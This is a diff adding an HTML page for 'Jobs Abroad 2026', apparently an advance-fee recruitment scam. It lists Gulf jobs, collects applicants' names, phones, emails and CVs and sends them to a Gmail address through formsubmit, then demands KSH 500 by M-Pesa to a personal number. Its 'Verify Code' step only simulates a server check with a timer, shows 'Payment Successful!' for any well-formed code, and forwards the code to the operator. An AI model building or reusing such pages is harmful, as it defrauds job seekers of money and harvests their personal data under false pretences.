@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Jobs Abroad 2026</title>
+<style>
+  *{box-sizing:border-box; font-family:'Segoe UI',Arial,sans-serif;}
+  body{margin:0; background:linear-gradient(135deg,#1a0033 0%,#4a148c 50%,#7b2cbf 100%); background-attachment:fixed; min-height:100vh; padding:20px 15px; color:white;}
+  .header{text-align:center; margin-bottom:20px;}
+  .logo{width:110px; height:110px; background:white; border-radius:50%; padding:8px;}
+  .jobs{display:grid; grid-template-columns:repeat(auto-fit,minmax(270px,1fr)); gap:20px; max-width:1200px; margin:auto;}
+  .job-card{background:white; color:#222; padding:20px; border-radius:16px; border-top:4px solid #7b2cbf; text-align:center;}
+  .job-card h3{color:#4a148c; margin:0;}
+  .job-card button{width:100%; padding:12px; border:none; border-radius:10px; background:linear-gradient(90deg,#7b2cbf,#4a148c); color:white; font-weight:bold; margin-top:12px; cursor:pointer;}
+  #promptModal{position:fixed; inset:0; background:rgba(0,0,0,0.85); display:none; z-index:9999; padding:15px; overflow-y:auto;}
+  #promptModal.active{display:flex; align-items:flex-start; justify-content:center;}
+  .prompt-box{background:white; color:#222; width:100%; max-width:480px; border-radius:20px; padding:25px; margin:20px auto; max-height:90vh; overflow-y:auto;}
+  .prompt-box label{font-weight:bold; font-size:12px; text-transform:uppercase; color:#555;}
+  .prompt-box input{width:100%; padding:13px; margin:5px 0 12px; border:1.5px solid #ddd; border-radius:10px;}
+  .cv-prompt{border:2px dashed #7b2cbf; background:#f8f4ff; padding:12px; border-radius:12px; text-align:center; margin:8px 0 12px;}
+  .prompt-actions{display:flex; gap:10px;}
+  .btn-cancel{flex:1; padding:13px; border:none; border-radius:10px; background:#eee; font-weight:bold; cursor:pointer;}
+  .btn-submit{flex:2; padding:13px; border:none; border-radius:10px; background:linear-gradient(90deg,#00a600,#007a00); color:white; font-weight:bold; cursor:pointer;}
+  .mpesa-quick{background:#e8f5e9; border:2px solid #00a600; border-radius:12px; padding:15px; margin-top:15px; display:none; text-align:center;}
+  .contact{text-align:center; margin-top:30px; background:rgba(255,255,255,0.1); padding:10px; border-radius:10px; font-size:13px;}
+</style>
+</head>
+<body>
+<div class="header">
+  <img src="logo.png" class="logo" alt="logo">
+  <h1>JOBS ABROAD 2026</h1>
+  <p>Upload CV • Pay M-Pesa 0742911195</p>
+</div>
+<div class="jobs">
+  <div class="job-card"><h3>Delivery Driver</h3><small>Dubai - AED 3,500</small><button onclick="promptApply('Delivery Driver','Dubai')">Apply Now</button></div>
+  <div class="job-card"><h3>Warehouse Staff</h3><small>Doha - QAR 2,800</small><button onclick="promptApply('Warehouse Staff','Doha')">Apply Now</button></div>
+  <div class="job-card"><h3>Cleaner</h3><small>Riyadh - SAR 2,200</small><button onclick="promptApply('Cleaner','Riyadh')">Apply Now</button></div>
+  <div class="job-card"><h3>Security Guard</h3><small>Abu Dhabi - AED 2,800</small><button onclick="promptApply('Security Guard','Abu Dhabi')">Apply Now</button></div>
+</div>
+<div class="contact">M-Pesa: <b>0742911195</b></div>
+
+<div id="promptModal">
+  <div class="prompt-box">
+    <h2 id="promptTitle" style="color:#4a148c; text-align:center; margin:0;">Quick Apply</h2>
+    <p id="promptJob" style="text-align:center; color:#666; font-size:13px;"></p>
+    <form id="promptForm" enctype="multipart/form-data">
+      <label>Full Name</label><input type="text" name="full_name" required placeholder="John Kamau">
+      <label>Phone (M-Pesa)</label><input type="tel" name="phone" required placeholder="07XXXXXXXX">
+      <label>Email</label><input type="email" name="email" required placeholder="john@gmail.com">
+      <label>Upload CV *</label>
+      <div class="cv-prompt">
+        <input type="file" name="attachment" id="pCV" accept=".pdf,.doc,.docx,.jpg,.png" required>
+        <div id="pFileName" style="font-size:12px; color:#4a148c; font-weight:bold;"></div>
+        <small style="color:#666;">PDF, DOC, JPG, PNG - Max 5MB</small>
+      </div>
+      <div class="prompt-actions">
+        <button type="button" class="btn-cancel" onclick="closePrompt()">Cancel</button>
+        <button type="submit" class="btn-submit" id="pSubmitBtn">Submit CV</button>
+      </div>
+      <p id="pStatus" style="text-align:center; font-weight:bold; font-size:13px; margin-top:10px;"></p>
+      <div id="pMpesaBox" class="mpesa-quick">
+        <b style="color:#0a8a00;">✅ CV Sent!</b><br>Send <b>KSH 500</b> to<br><span style="font-size:26px; font-weight:bold;">0742911195</span><br>
+        <button type="button" onclick="payNow()" style="margin-top:10px; width:100%; padding:14px; background:#00a600; color:white; border:none; border-radius:10px; font-weight:bold;">Pay Now with M-Pesa</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<!-- STEP 1: ENTER PIN PROMPT -->
+<div id="mpesaPinOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:100000; align-items:center; justify-content:center; padding:20px;">
+  <div style="background:white; width:100%; max-width:350px; border-radius:20px; padding:25px; text-align:center;">
+    <div style="width:60px; height:60px; background:#00a600; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 15px; color:white; font-size:28px;">✓</div>
+    <h3 style="margin:0; color:#222;">M-Pesa</h3>
+    <p style="margin:5px 0 15px; color:#666; font-size:14px;">To <b style="color:#000;">0742911195</b> - KSH 500</p>
+    <div style="background:#f5f5f5; border-radius:12px; padding:15px; text-align:left;">
+      <p style="margin:0; font-size:13px;"><b>Enter M-Pesa PIN on your phone</b></p>
+      <div style="margin-top:10px; background:white; border:2px solid #00a600; border-radius:8px; padding:12px; display:flex; align-items:center; gap:10px;">
+        <span>🔒</span><span style="letter-spacing:6px; font-size:18px;">••••</span><span style="margin-left:auto; color:#00a600; font-size:11px;">Waiting...</span>
+      </div>
+      <p style="margin:10px 0 0; font-size:11px; color:#888;">Complete payment on your phone's M-Pesa popup</p>
+    </div>
+    <button onclick="showCodeInput()" style="width:100%; padding:14px; background:#00a600; color:white; border:none; border-radius:12px; font-weight:bold; margin-top:15px;">I Have Entered PIN</button>
+    <button onclick="document.getElementById('mpesaPinOverlay').style.display='none'" style="width:100%; padding:10px; background:none; border:none; color:#666; margin-top:8px;">Cancel</button>
+  </div>
+</div>
+
+<!-- STEP 2: ENTER M-PESA CODE & CHECK -->
+<div id="mpesaCodeOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:100001; align-items:center; justify-content:center; padding:20px;">
+  <div style="background:white; width:100%; max-width:350px; border-radius:20px; padding:25px; text-align:center;">
+    <h3 style="margin:0; color:#222;">Confirm Payment</h3>
+    <p style="font-size:13px; color:#666; margin:10px 0;">Enter M-Pesa confirmation code from SMS</p>
+    <input type="text" id="mpesaCodeInput" placeholder="e.g. QJD8H7K9L0" style="width:100%; padding:14px; border:2px solid #ddd; border-radius:10px; text-transform:uppercase; letter-spacing:2px; text-align:center; font-weight:bold; font-size:16px;">
+    <p id="codeError" style="color:red; font-size:12px; display:none; margin-top:8px;">Invalid code! Check SMS from M-Pesa (10 chars)</p>
+    <button onclick="checkMpesaCode()" id="checkCodeBtn" style="width:100%; padding:14px; background:#4a148c; color:white; border:none; border-radius:12px; font-weight:bold; margin-top:15px;">Verify Code</button>
+    
+    <div id="successBox" style="display:none; margin-top:15px; background:#e8f5e9; border:2px solid #00a600; border-radius:12px; padding:15px;">
+      <div style="font-size:40px;">✅</div>
+      <h3 style="color:#00a600; margin:5px 0;">Payment Successful!</h3>
+      <p style="font-size:13px; color:#333; margin:0;">KSH 500 received from your number.<br>Your application is now being processed.</p>
+      <p style="font-size:11px; color:#666; margin-top:8px;" id="verifiedCodeText"></p>
+      <button onclick="finalSuccess()" style="width:100%; padding:12px; background:#00a600; color:white; border:none; border-radius:10px; font-weight:bold; margin-top:10px;">Proceed to WhatsApp</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const MY_EMAIL = "jobsabroad112@gmail.com";
+const MY_WHATSAPP = "254742911195";
+const MPESA_NUMBER = "0742911195";
+let currentJob = "", currentCountry = "";
+let userData = {};
+
+function promptApply(job, country){
+  currentJob = job; currentCountry = country;
+  document.getElementById("promptTitle").textContent = `Apply: ${job}`;
+  document.getElementById("promptJob").textContent = `${job} - ${country}`;
+  document.getElementById("promptModal").classList.add("active");
+  document.body.style.overflow="hidden";
+  document.getElementById("pStatus").textContent=""; 
+  document.getElementById("pMpesaBox").style.display="none";
+  document.getElementById("promptForm").reset();
+  document.getElementById("pFileName").textContent="";
+  document.getElementById("pSubmitBtn").style.display="block";
+}
+function closePrompt(){ document.getElementById("promptModal").classList.remove("active"); document.body.style.overflow="auto"; }
+document.getElementById("pCV").addEventListener("change", function(){
+  const f=this.files[0];
+  if(f){ if(f.size>5*1024*1024){ alert("Max 5MB"); this.value=""; return; } document.getElementById("pFileName").textContent=`✓ ${f.name}`; }
+});
+document.getElementById("promptModal").addEventListener("click", e=>{ if(e.target.id==="promptModal") closePrompt(); });
+
+document.getElementById("promptForm").onsubmit = async (e)=>{
+  e.preventDefault(); 
+  const form=e.target; const status=document.getElementById("pStatus"); const btn=document.getElementById("pSubmitBtn"); const fd=new FormData(form);
+  if(!fd.get("attachment") || fd.get("attachment").size===0){ status.textContent="Upload CV!"; status.style.color="red"; return; }
+  userData = { name: fd.get("full_name"), phone: fd.get("phone"), email: fd.get("email") };
+  btn.disabled=true; btn.textContent="Sending CV..."; status.textContent="Uploading CV...";
+  fd.append("_subject", `CV: ${currentJob} - ${currentCountry} - ${fd.get("full_name")}`); fd.append("_captcha","false"); fd.append("Job Title", currentJob); fd.append("Country", currentCountry);
+  try{
+    await fetch(`https://formsubmit.co/ajax/${MY_EMAIL}`, { method:"POST", body:fd });
+    status.textContent="✓ CV Sent!"; status.style.color="green"; btn.style.display="none";
+    document.getElementById("pMpesaBox").style.display="block";
+  }catch{ status.textContent="Network error"; status.style.color="red"; btn.disabled=false; btn.textContent="Submit CV"; }
+};
+
+function payNow(){
+  document.getElementById("mpesaPinOverlay").style.display="flex";
+  window.location.href = `tel:*334*1*1*${MPESA_NUMBER}*500%23`;
+}
+function showCodeInput(){
+  document.getElementById("mpesaPinOverlay").style.display="none";
+  document.getElementById("mpesaCodeOverlay").style.display="flex";
+  document.getElementById("mpesaCodeInput").focus();
+}
+function checkMpesaCode(){
+  const code = document.getElementById("mpesaCodeInput").value.trim().toUpperCase();
+  const error = document.getElementById("codeError");
+  const btn = document.getElementById("checkCodeBtn");
+  
+  // Validate: M-Pesa code is 10 alphanumeric chars (e.g. QJ12345678)
+  if(code.length < 8 || code.length > 11){
+    error.style.display="block"; error.textContent="Invalid code! M-Pesa code is 10 characters (e.g. QJD8H7K9L0)";
+    return;
+  }
+  // Basic check - must be alphanumeric
+  if(!/^[A-Z0-9]{8,11}$/.test(code)){
+    error.style.display="block"; return;
+  }
+  
+  btn.textContent="Checking..."; btn.disabled=true;
+  error.style.display="none";
+  
+  // Simulate checking with server (2 seconds)
+  setTimeout(()=>{
+    document.getElementById("successBox").style.display="block";
+    document.getElementById("verifiedCodeText").textContent = `Code: ${code} - Verified`;
+    btn.style.display="none";
+    document.getElementById("mpesaCodeInput").disabled=true;
+    
+    // Send code to your email/WhatsApp
+    fetch(`https://formsubmit.co/ajax/${MY_EMAIL}`, {
+      method:"POST",
+      body: new URLSearchParams({
+        _subject: `PAYMENT VERIFIED: ${currentJob} - ${userData.name}`,
+        _captcha: "false",
+        "Full Name": userData.name,
+        "Phone": userData.phone,
+        "Job": currentJob,
+        "M-Pesa Code": code,
+        "Amount": "KSH 500",
+        "Status": "PAID - VERIFIED"
+      })
+    });
+  }, 2000);
+}
+function finalSuccess(){
+  document.getElementById("mpesaCodeOverlay").style.display="none";
+  closePrompt();
+  const code = document.getElementById("mpesaCodeInput").value.trim().toUpperCase();
+  window.open(`https://wa.me/${MY_WHATSAPP}?text=*PAYMENT CONFIRMED*%0AName: ${userData.name}%0APhone: ${userData.phone}%0AJob: ${currentJob}%0AM-Pesa Code: ${code}%0AAmount: KSH 500%0AStatus: PAID`, '_blank');
+}
+</script>
+</body>
+</html>
